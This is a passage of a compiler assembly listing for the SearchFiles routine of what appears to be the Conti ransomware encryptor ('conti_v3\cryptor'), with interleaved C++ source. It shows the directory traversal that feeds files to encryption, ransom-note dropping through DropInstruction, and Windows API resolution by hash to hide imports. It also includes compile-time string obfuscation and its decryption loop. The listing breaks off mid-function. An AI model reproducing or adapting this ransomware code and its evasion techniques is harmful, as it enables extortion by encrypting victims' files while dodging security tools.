; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
;	COMDAT ?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z
_TEXT	SEGMENT
$T16 = 32
$T17 = 40
$T10 = 48
$T18 = 176
$T44 = 208
RsaKey$GSCopy$1$ = 240
Buffer$GSCopy$1$ = 248
$T20 = 256
$T46 = 288
$T25 = 320
$T34 = 328
$T6 = 336
$T8 = 368
DirectoryList$ = 400
FileInfo$74 = 416
CurrentDirectory$75 = 1072
SearchMask$76 = 1104
Filename$77 = 1136
Directory$78 = 1168
_Masked$79 = 1200
_Masked$80 = 1208
FindData$81 = 1216
__$ArrayPad$ = 1808
StartDirectory$ = 1904
CryptoProvider$ = 1912
RsaKey$ = 1920
Buffer$ = 1928
?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z PROC ; filesystem::SearchFiles, COMDAT

; 161  : {

$LN1829:
  00000	40 55		 push	 rbp
  00002	53		 push	 rbx
  00003	56		 push	 rsi
  00004	57		 push	 rdi
  00005	41 54		 push	 r12
  00007	41 55		 push	 r13
  00009	41 56		 push	 r14
  0000b	41 57		 push	 r15
  0000d	48 8d ac 24 d8
	f9 ff ff	 lea	 rbp, QWORD PTR [rsp-1576]
  00015	48 81 ec 28 07
	00 00		 sub	 rsp, 1832		; 00000728H
  0001c	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00023	48 33 c4	 xor	 rax, rsp
  00026	48 89 85 10 06
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp-256], rax

; 162  : 	TAILQ_HEAD(, directory_info_) DirectoryList;
; 163  : 	TAILQ_INIT(&DirectoryList);

  0002d	33 f6		 xor	 esi, esi
  0002f	4c 89 4d f8	 mov	 QWORD PTR Buffer$GSCopy$1$[rbp-256], r9
  00033	4c 8b e1	 mov	 r12, rcx
  00036	4c 89 45 f0	 mov	 QWORD PTR RsaKey$GSCopy$1$[rbp-256], r8
  0003a	48 8d 85 90 00
	00 00		 lea	 rax, QWORD PTR DirectoryList$[rbp-256]
  00041	48 89 b5 90 00
	00 00		 mov	 QWORD PTR DirectoryList$[rbp-256], rsi
  00048	4c 8b ea	 mov	 r13, rdx
  0004b	48 89 85 98 00
	00 00		 mov	 QWORD PTR DirectoryList$[rbp-248], rax

; 164  : 
; 165  : 	PDIRECTORY_INFO StartDirectoryInfo = new DIRECTORY_INFO;

  00052	8d 4e 30	 lea	 ecx, QWORD PTR [rsi+48]
  00055	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  0005a	0f 57 c0	 xorps	 xmm0, xmm0
  0005d	48 8b d8	 mov	 rbx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00060	0f 11 00	 movups	 XMMWORD PTR [rax], xmm0

; 2648 :         _My_data._Mysize = 0;

  00063	48 89 70 10	 mov	 QWORD PTR [rax+16], rsi

; 2649 :         _My_data._Myres  = _Small_string_capacity;

  00067	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 2650 :         _My_data._Activate_SSO_buffer();
; 2651 : 
; 2652 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 2653 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  0006f	66 89 30	 mov	 WORD PTR [rax], si

; 3189 :         if (this == _STD addressof(_Right)) {

  00072	49 3b c4	 cmp	 rax, r12
  00075	74 4f		 je	 SHORT $LN7@SearchFile

; 2244 :         return _Myres > _Small_string_capacity;

  00077	49 83 7c 24 18
	07		 cmp	 QWORD PTR [r12+24], 7

; 2235 :         const value_type* _Result = _Bx._Buf;

  0007d	4d 8b cc	 mov	 r9, r12

; 2236 :         if (_Large_mode_engaged()) {

  00080	76 04		 jbe	 SHORT $LN1708@SearchFile

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  00082	4d 8b 0c 24	 mov	 r9, QWORD PTR [r12]
$LN1708@SearchFile:

; 3228 :         assign(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  00086	49 8b 54 24 10	 mov	 rdx, QWORD PTR [r12+16]

; 3412 :         if (_Count <= _Mypair._Myval2._Myres) {

  0008b	48 83 fa 07	 cmp	 rdx, 7
  0008f	77 2d		 ja	 SHORT $LN1622@SearchFile

; 2244 :         return _Myres > _Small_string_capacity;

  00091	48 83 78 18 07	 cmp	 QWORD PTR [rax+24], 7

; 2226 :         value_type* _Result = _Bx._Buf;

  00096	48 8b f3	 mov	 rsi, rbx

; 2227 :         if (_Large_mode_engaged()) {

  00099	76 03		 jbe	 SHORT $LN1625@SearchFile

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

  0009b	48 8b 30	 mov	 rsi, QWORD PTR [rax]
$LN1625@SearchFile:

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  0009e	48 8d 3c 12	 lea	 rdi, QWORD PTR [rdx+rdx]

; 3415 :             _Mypair._Myval2._Mysize = _Count;

  000a2	48 89 50 10	 mov	 QWORD PTR [rax+16], rdx

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  000a6	4c 8b c7	 mov	 r8, rdi
  000a9	49 8b d1	 mov	 rdx, r9
  000ac	48 8b ce	 mov	 rcx, rsi
  000af	e8 00 00 00 00	 call	 memmove

; 3417 :             _Traits::assign(_Old_ptr[_Count], _Elem());

  000b4	33 c0		 xor	 eax, eax
  000b6	66 89 04 37	 mov	 WORD PTR [rdi+rsi], ax

; 3418 :             _ASAN_STRING_CREATE(*this);
; 3419 :             return *this;

  000ba	33 f6		 xor	 esi, esi
  000bc	eb 08		 jmp	 SHORT $LN7@SearchFile
$LN1622@SearchFile:

; 3420 :         }
; 3421 : 
; 3422 :         return _Reallocate_for(

  000be	48 8b cb	 mov	 rcx, rbx
  000c1	e8 00 00 00 00	 call	 ??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
$LN7@SearchFile:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 171  : 	TAILQ_INSERT_TAIL(&DirectoryList, StartDirectoryInfo, Entries);

  000c6	48 89 73 20	 mov	 QWORD PTR [rbx+32], rsi
  000ca	48 8d 4b 20	 lea	 rcx, QWORD PTR [rbx+32]
  000ce	48 8b 85 98 00
	00 00		 mov	 rax, QWORD PTR DirectoryList$[rbp-248]
  000d5	48 89 43 28	 mov	 QWORD PTR [rbx+40], rax
  000d9	48 8b 85 98 00
	00 00		 mov	 rax, QWORD PTR DirectoryList$[rbp-248]
  000e0	48 89 18	 mov	 QWORD PTR [rax], rbx
  000e3	48 89 8d 98 00
	00 00		 mov	 QWORD PTR DirectoryList$[rbp-248], rcx
  000ea	66 0f 1f 44 00
	00		 npad	 6
$LL8@SearchFile:

; 173  : 	while (!TAILQ_EMPTY(&DirectoryList)) {

  000f0	4c 8b b5 90 00
	00 00		 mov	 r14, QWORD PTR DirectoryList$[rbp-256]
  000f7	4d 85 f6	 test	 r14, r14
  000fa	0f 84 a5 0c 00
	00		 je	 $LN9@SearchFile

; 174  : 
; 175  : 		WIN32_FIND_DATAW FindData;
; 176  : 		PDIRECTORY_INFO DirectoryInfo = TAILQ_FIRST(&DirectoryList);
; 177  : 		if (DirectoryInfo == NULL) {
; 178  : 			break;
; 179  : 		}
; 180  : 
; 181  : 		std::wstring CurrentDirectory = DirectoryInfo->Directory;

  00100	49 8b d6	 mov	 rdx, r14
  00103	48 8d 8d 30 03
	00 00		 lea	 rcx, QWORD PTR CurrentDirectory$75[rbp-256]
  0010a	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >

; 182  : 		std::wstring SearchMask = MakeSearchMask(CurrentDirectory);

  0010f	48 8d 95 30 03
	00 00		 lea	 rdx, QWORD PTR CurrentDirectory$75[rbp-256]
  00116	48 8d 4d 50	 lea	 rcx, QWORD PTR $T6[rbp-256]
  0011a	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  0011f	48 8b d0	 mov	 rdx, rax
  00122	48 8d 8d 50 03
	00 00		 lea	 rcx, QWORD PTR SearchMask$76[rbp-256]
  00129	e8 00 00 00 00	 call	 ?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z ; MakeSearchMask

; 183  : 
; 184  : 		DropInstruction(CurrentDirectory);

  0012e	48 8d 95 30 03
	00 00		 lea	 rdx, QWORD PTR CurrentDirectory$75[rbp-256]
  00135	48 8d 4d 70	 lea	 rcx, QWORD PTR $T8[rbp-256]
  00139	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  0013e	48 8b c8	 mov	 rcx, rax
  00141	e8 00 00 00 00	 call	 ?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z ; DropInstruction
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00146	48 83 bd 68 03
	00 00 07	 cmp	 QWORD PTR SearchMask$76[rbp-232], 7

; 2235 :         const value_type* _Result = _Bx._Buf;

  0014e	48 8d bd 50 03
	00 00		 lea	 rdi, QWORD PTR SearchMask$76[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 524  : 	pFunction = (HANDLE(WINAPI*)(LPCWSTR, LPWIN32_FIND_DATAW))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4796a6c5, 63);//GetProcAddress(hKernel32, OBFA("FindFirstFileW"));

  00155	ba 0f 00 00 00	 mov	 edx, 15
  0015a	41 b8 c5 a6 96
	47		 mov	 r8d, 1201055429		; 4796a6c5H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2236 :         if (_Large_mode_engaged()) {

  00160	48 0f 47 bd 50
	03 00 00	 cmova	 rdi, QWORD PTR SearchMask$76[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 524  : 	pFunction = (HANDLE(WINAPI*)(LPCWSTR, LPWIN32_FIND_DATAW))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4796a6c5, 63);//GetProcAddress(hKernel32, OBFA("FindFirstFileW"));

  00168	44 8d 4a 30	 lea	 r9d, QWORD PTR [rdx+48]
  0016c	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 525  : 	return pFunction(lpFileName, lpFindFileData);

  00171	48 8d 95 c0 03
	00 00		 lea	 rdx, QWORD PTR FindData$81[rbp-256]
  00178	48 8b cf	 mov	 rcx, rdi
  0017b	ff d0		 call	 rax
  0017d	4c 8b f8	 mov	 r15, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 187  : 		if (hSearchFile == INVALID_HANDLE_VALUE) {

  00180	48 83 f8 ff	 cmp	 rax, -1
  00184	0f 85 e6 03 00
	00		 jne	 $LL15@SearchFile
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  0018a	48 83 bd 48 03
	00 00 07	 cmp	 QWORD PTR CurrentDirectory$75[rbp-232], 7

; 2235 :         const value_type* _Result = _Bx._Buf;

  00192	48 8d 9d 30 03
	00 00		 lea	 rbx, QWORD PTR CurrentDirectory$75[rbp-256]

; 2236 :         if (_Large_mode_engaged()) {

  00199	48 0f 47 9d 30
	03 00 00	 cmova	 rbx, QWORD PTR CurrentDirectory$75[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  001a1	c6 44 24 30 00	 mov	 BYTE PTR $T10[rsp], 0
  001a6	c6 44 24 31 77	 mov	 BYTE PTR $T10[rsp+1], 119 ; 00000077H
  001ab	c6 44 24 32 28	 mov	 BYTE PTR $T10[rsp+2], 40 ; 00000028H
  001b0	c6 44 24 33 5f	 mov	 BYTE PTR $T10[rsp+3], 95 ; 0000005fH
  001b5	c6 44 24 34 28	 mov	 BYTE PTR $T10[rsp+4], 40 ; 00000028H
  001ba	c6 44 24 35 13	 mov	 BYTE PTR $T10[rsp+5], 19
  001bf	c6 44 24 36 28	 mov	 BYTE PTR $T10[rsp+6], 40 ; 00000028H
  001c4	c6 44 24 37 2c	 mov	 BYTE PTR $T10[rsp+7], 44 ; 0000002cH
  001c9	c6 44 24 38 28	 mov	 BYTE PTR $T10[rsp+8], 40 ; 00000028H
  001ce	c6 44 24 39 77	 mov	 BYTE PTR $T10[rsp+9], 119 ; 00000077H
  001d3	c6 44 24 3a 28	 mov	 BYTE PTR $T10[rsp+10], 40 ; 00000028H
  001d8	c6 44 24 3b 5f	 mov	 BYTE PTR $T10[rsp+11], 95 ; 0000005fH
  001dd	c6 44 24 3c 28	 mov	 BYTE PTR $T10[rsp+12], 40 ; 00000028H
  001e2	c6 44 24 3d 09	 mov	 BYTE PTR $T10[rsp+13], 9
  001e7	c6 44 24 3e 28	 mov	 BYTE PTR $T10[rsp+14], 40 ; 00000028H
  001ec	c6 44 24 3f 46	 mov	 BYTE PTR $T10[rsp+15], 70 ; 00000046H
  001f1	c6 44 24 40 28	 mov	 BYTE PTR $T10[rsp+16], 40 ; 00000028H
  001f6	c6 44 24 41 04	 mov	 BYTE PTR $T10[rsp+17], 4
  001fb	c6 44 24 42 28	 mov	 BYTE PTR $T10[rsp+18], 40 ; 00000028H
  00200	c6 44 24 43 77	 mov	 BYTE PTR $T10[rsp+19], 119 ; 00000077H
  00205	c6 44 24 44 28	 mov	 BYTE PTR $T10[rsp+20], 40 ; 00000028H
  0020a	c6 44 24 45 5f	 mov	 BYTE PTR $T10[rsp+21], 95 ; 0000005fH
  0020f	c6 44 24 46 28	 mov	 BYTE PTR $T10[rsp+22], 40 ; 00000028H
  00214	c6 44 24 47 18	 mov	 BYTE PTR $T10[rsp+23], 24
  00219	c6 44 24 48 28	 mov	 BYTE PTR $T10[rsp+24], 40 ; 00000028H
  0021e	c6 44 24 49 69	 mov	 BYTE PTR $T10[rsp+25], 105 ; 00000069H
  00223	c6 44 24 4a 28	 mov	 BYTE PTR $T10[rsp+26], 40 ; 00000028H
  00228	c6 44 24 4b 57	 mov	 BYTE PTR $T10[rsp+27], 87 ; 00000057H
  0022d	c6 44 24 4c 28	 mov	 BYTE PTR $T10[rsp+28], 40 ; 00000028H
  00232	c6 44 24 4d 27	 mov	 BYTE PTR $T10[rsp+29], 39 ; 00000027H
  00237	c6 44 24 4e 28	 mov	 BYTE PTR $T10[rsp+30], 40 ; 00000028H
  0023c	c6 44 24 4f 73	 mov	 BYTE PTR $T10[rsp+31], 115 ; 00000073H
  00241	c6 44 24 50 28	 mov	 BYTE PTR $T10[rsp+32], 40 ; 00000028H
  00246	c6 44 24 51 5f	 mov	 BYTE PTR $T10[rsp+33], 95 ; 0000005fH
  0024b	c6 44 24 52 28	 mov	 BYTE PTR $T10[rsp+34], 40 ; 00000028H
  00250	c6 44 24 53 18	 mov	 BYTE PTR $T10[rsp+35], 24
  00255	c6 44 24 54 28	 mov	 BYTE PTR $T10[rsp+36], 40 ; 00000028H
  0025a	c6 44 24 55 46	 mov	 BYTE PTR $T10[rsp+37], 70 ; 00000046H
  0025f	c6 44 24 56 28	 mov	 BYTE PTR $T10[rsp+38], 40 ; 00000028H
  00264	c6 44 24 57 57	 mov	 BYTE PTR $T10[rsp+39], 87 ; 00000057H
  00269	c6 44 24 58 28	 mov	 BYTE PTR $T10[rsp+40], 40 ; 00000028H
  0026e	c6 44 24 59 5f	 mov	 BYTE PTR $T10[rsp+41], 95 ; 0000005fH
  00273	c6 44 24 5a 28	 mov	 BYTE PTR $T10[rsp+42], 40 ; 00000028H
  00278	c6 44 24 5b 13	 mov	 BYTE PTR $T10[rsp+43], 19
  0027d	c6 44 24 5c 28	 mov	 BYTE PTR $T10[rsp+44], 40 ; 00000028H
  00282	c6 44 24 5d 57	 mov	 BYTE PTR $T10[rsp+45], 87 ; 00000057H
  00287	c6 44 24 5e 28	 mov	 BYTE PTR $T10[rsp+46], 40 ; 00000028H
  0028c	c6 44 24 5f 2c	 mov	 BYTE PTR $T10[rsp+47], 44 ; 0000002cH
  00291	c6 44 24 60 28	 mov	 BYTE PTR $T10[rsp+48], 40 ; 00000028H
  00296	c6 44 24 61 5f	 mov	 BYTE PTR $T10[rsp+49], 95 ; 0000005fH
  0029b	c6 44 24 62 28	 mov	 BYTE PTR $T10[rsp+50], 40 ; 00000028H
  002a0	c6 44 24 63 09	 mov	 BYTE PTR $T10[rsp+51], 9
  002a5	c6 44 24 64 28	 mov	 BYTE PTR $T10[rsp+52], 40 ; 00000028H
  002aa	c6 44 24 65 69	 mov	 BYTE PTR $T10[rsp+53], 105 ; 00000069H
  002af	c6 44 24 66 28	 mov	 BYTE PTR $T10[rsp+54], 40 ; 00000028H
  002b4	c6 44 24 67 6e	 mov	 BYTE PTR $T10[rsp+55], 110 ; 0000006eH
  002b9	c6 44 24 68 28	 mov	 BYTE PTR $T10[rsp+56], 40 ; 00000028H
  002be	c6 44 24 69 04	 mov	 BYTE PTR $T10[rsp+57], 4
  002c3	c6 44 24 6a 28	 mov	 BYTE PTR $T10[rsp+58], 40 ; 00000028H
  002c8	c6 44 24 6b 50	 mov	 BYTE PTR $T10[rsp+59], 80 ; 00000050H
  002cd	c6 44 24 6c 28	 mov	 BYTE PTR $T10[rsp+60], 40 ; 00000028H
  002d2	c6 44 24 6d 09	 mov	 BYTE PTR $T10[rsp+61], 9
  002d7	c6 44 24 6e 28	 mov	 BYTE PTR $T10[rsp+62], 40 ; 00000028H
  002dc	c6 44 24 6f 37	 mov	 BYTE PTR $T10[rsp+63], 55 ; 00000037H
  002e1	c6 44 24 70 28	 mov	 BYTE PTR $T10[rsp+64], 40 ; 00000028H
  002e6	c6 44 24 71 57	 mov	 BYTE PTR $T10[rsp+65], 87 ; 00000057H
  002eb	c6 44 24 72 28	 mov	 BYTE PTR $T10[rsp+66], 40 ; 00000028H
  002f0	c6 44 24 73 0b	 mov	 BYTE PTR $T10[rsp+67], 11
  002f5	c6 44 24 74 28	 mov	 BYTE PTR $T10[rsp+68], 40 ; 00000028H
  002fa	c6 44 24 75 46	 mov	 BYTE PTR $T10[rsp+69], 70 ; 00000046H
  002ff	c6 44 24 76 28	 mov	 BYTE PTR $T10[rsp+70], 40 ; 00000028H
  00304	c6 44 24 77 34	 mov	 BYTE PTR $T10[rsp+71], 52 ; 00000034H
  00309	c6 44 24 78 28	 mov	 BYTE PTR $T10[rsp+72], 40 ; 00000028H
  0030e	c6 44 24 79 57	 mov	 BYTE PTR $T10[rsp+73], 87 ; 00000057H
  00313	c6 44 24 7a 28	 mov	 BYTE PTR $T10[rsp+74], 40 ; 00000028H
  00318	c6 44 24 7b 35	 mov	 BYTE PTR $T10[rsp+75], 53 ; 00000035H
  0031d	c6 44 24 7c 28	 mov	 BYTE PTR $T10[rsp+76], 40 ; 00000028H
  00322	c6 44 24 7d 69	 mov	 BYTE PTR $T10[rsp+77], 105 ; 00000069H

; 41   : }
; 42   : 
; 43   : template<unsigned char A, unsigned char B, typename Indexes>
; 44   : class MetaBuffer;
; 45   : 
; 46   : template<unsigned char A, unsigned char B, size_t... Ints>
; 47   : class MetaBuffer<A, B, std::index_sequence<Ints...>>
; 48   : {
; 49   : public:
; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)
; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00327	c6 44 24 7e 28	 mov	 BYTE PTR $T10[rsp+78], 40 ; 00000028H
  0032c	c6 44 24 7f 04	 mov	 BYTE PTR $T10[rsp+79], 4
  00331	c6 45 80 28	 mov	 BYTE PTR $T10[rbp-176], 40 ; 00000028H
  00335	c6 45 81 68	 mov	 BYTE PTR $T10[rbp-175], 104 ; 00000068H
  00339	c6 45 82 28	 mov	 BYTE PTR $T10[rbp-174], 40 ; 00000028H
  0033d	c6 45 83 73	 mov	 BYTE PTR $T10[rbp-173], 115 ; 00000073H
  00341	c6 45 84 28	 mov	 BYTE PTR $T10[rbp-172], 40 ; 00000028H
  00345	c6 45 85 46	 mov	 BYTE PTR $T10[rbp-171], 70 ; 00000046H
  00349	c6 45 86 28	 mov	 BYTE PTR $T10[rbp-170], 40 ; 00000028H
  0034d	c6 45 87 04	 mov	 BYTE PTR $T10[rbp-169], 4
  00351	c6 45 88 28	 mov	 BYTE PTR $T10[rbp-168], 40 ; 00000028H
  00355	c6 45 89 3a	 mov	 BYTE PTR $T10[rbp-167], 58 ; 0000003aH
  00359	c6 45 8a 28	 mov	 BYTE PTR $T10[rbp-166], 40 ; 00000028H
  0035d	c6 45 8b 09	 mov	 BYTE PTR $T10[rbp-165], 9
  00361	c6 45 8c 28	 mov	 BYTE PTR $T10[rbp-164], 40 ; 00000028H
  00365	c6 45 8d 09	 mov	 BYTE PTR $T10[rbp-163], 9
  00369	c6 45 8e 28	 mov	 BYTE PTR $T10[rbp-162], 40 ; 00000028H
  0036d	c6 45 8f 50	 mov	 BYTE PTR $T10[rbp-161], 80 ; 00000050H
  00371	c6 45 90 28	 mov	 BYTE PTR $T10[rbp-160], 40 ; 00000028H
  00375	c6 45 91 09	 mov	 BYTE PTR $T10[rbp-159], 9
  00379	c6 45 92 28	 mov	 BYTE PTR $T10[rbp-158], 40 ; 00000028H
  0037d	c6 45 93 57	 mov	 BYTE PTR $T10[rbp-157], 87 ; 00000057H
  00381	c6 45 94 28	 mov	 BYTE PTR $T10[rbp-156], 40 ; 00000028H
  00385	c6 45 95 4e	 mov	 BYTE PTR $T10[rbp-155], 78 ; 0000004eH
  00389	c6 45 96 28	 mov	 BYTE PTR $T10[rbp-154], 40 ; 00000028H
  0038d	c6 45 97 57	 mov	 BYTE PTR $T10[rbp-153], 87 ; 00000057H
  00391	c6 45 98 28	 mov	 BYTE PTR $T10[rbp-152], 40 ; 00000028H
  00395	c6 45 99 0b	 mov	 BYTE PTR $T10[rbp-151], 11
  00399	c6 45 9a 28	 mov	 BYTE PTR $T10[rbp-150], 40 ; 00000028H
  0039d	c6 45 9b 18	 mov	 BYTE PTR $T10[rbp-149], 24
  003a1	c6 45 9c 28	 mov	 BYTE PTR $T10[rbp-148], 40 ; 00000028H
  003a5	c6 45 9d 41	 mov	 BYTE PTR $T10[rbp-147], 65 ; 00000041H
  003a9	c6 45 9e 28	 mov	 BYTE PTR $T10[rbp-146], 40 ; 00000028H
  003ad	c6 45 9f 34	 mov	 BYTE PTR $T10[rbp-145], 52 ; 00000034H
  003b1	c6 45 a0 28	 mov	 BYTE PTR $T10[rbp-144], 40 ; 00000028H
  003b5	c6 45 a1 28	 mov	 BYTE PTR $T10[rbp-143], 40 ; 00000028H
  003b9	c6 45 a2 28	 mov	 BYTE PTR $T10[rbp-142], 40 ; 00000028H
  003bd	0f b6 44 24 31	 movzx	 eax, BYTE PTR $T10[rsp+1]

; 58   :         return m_isDecrypted;

  003c2	0f b6 44 24 30	 movzx	 eax, BYTE PTR $T10[rsp]

; 63   :         if (!isDecrypted())

  003c7	84 c0		 test	 al, al
  003c9	75 50		 jne	 SHORT $LN406@SearchFile

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  003cb	48 8b fe	 mov	 rdi, rsi
  003ce	66 90		 npad	 2
$LL407@SearchFile:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  003d0	0f b6 4c 3c 31	 movzx	 ecx, BYTE PTR $T10[rsp+rdi+1]

; 40   :     return (a % n + n) % n;

  003d5	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  003da	83 e9 28	 sub	 ecx, 40			; 00000028H
  003dd	6b c9 19	 imul	 ecx, ecx, 25

; 40   :     return (a % n + n) % n;

  003e0	f7 e9		 imul	 ecx
  003e2	03 d1		 add	 edx, ecx
  003e4	c1 fa 06	 sar	 edx, 6
  003e7	8b c2		 mov	 eax, edx
  003e9	c1 e8 1f	 shr	 eax, 31
  003ec	03 d0		 add	 edx, eax
  003ee	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  003f1	2b c8		 sub	 ecx, eax
  003f3	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  003f8	83 c1 7f	 add	 ecx, 127		; 0000007fH
  003fb	f7 e9		 imul	 ecx
  003fd	03 d1		 add	 edx, ecx
  003ff	c1 fa 06	 sar	 edx, 6
  00402	8b c2		 mov	 eax, edx
  00404	c1 e8 1f	 shr	 eax, 31
  00407	03 d0		 add	 edx, eax
  00409	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0040c	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0040e	88 4c 3c 31	 mov	 BYTE PTR $T10[rsp+rdi+1], cl
  00412	48 ff c7	 inc	 rdi
  00415	48 83 ff 72	 cmp	 rdi, 114		; 00000072H
  00419	72 b5		 jb	 SHORT $LL407@SearchFile
$LN406@SearchFile:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 209  : 	pFunction = (DWORD(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x9aab3800, 93);//GetProcAddress(hKernel32, OBFA("GetLastError"));

  0041b	ba 0f 00 00 00	 mov	 edx, 15
  00420	41 b8 00 38 ab
	9a		 mov	 r8d, -1700055040	; 9aab3800H
  00426	44 8d 4a 4e	 lea	 r9d, QWORD PTR [rdx+78]
  0042a	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 210  : 	return pFunction();

  0042f	ff d0		 call	 rax
  00431	44 8b c0	 mov	 r8d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 189  : 			logs::Write(OBFW(L"FindFirstFile fails in directory %s. GetLastError = %lu."), CurrentDirectory.c_str(), pGetLastError());

  00434	48 8d 4c 24 31	 lea	 rcx, QWORD PTR $T10[rsp+1]
  00439	48 8b d3	 mov	 rdx, rbx
  0043c	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 190  : 			TAILQ_REMOVE(&DirectoryList, DirectoryInfo, Entries);

  00441	49 8b 4e 20	 mov	 rcx, QWORD PTR [r14+32]
  00445	49 8b 46 28	 mov	 rax, QWORD PTR [r14+40]
  00449	48 85 c9	 test	 rcx, rcx
  0044c	74 06		 je	 SHORT $LN25@SearchFile
  0044e	48 89 41 28	 mov	 QWORD PTR [rcx+40], rax
  00452	eb 07		 jmp	 SHORT $LN26@SearchFile
$LN25@SearchFile:
  00454	48 89 85 98 00
	00 00		 mov	 QWORD PTR DirectoryList$[rbp-248], rax
$LN26@SearchFile:
  0045b	49 8b 4e 28	 mov	 rcx, QWORD PTR [r14+40]
  0045f	49 8b 46 20	 mov	 rax, QWORD PTR [r14+32]
  00463	48 89 01	 mov	 QWORD PTR [rcx], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

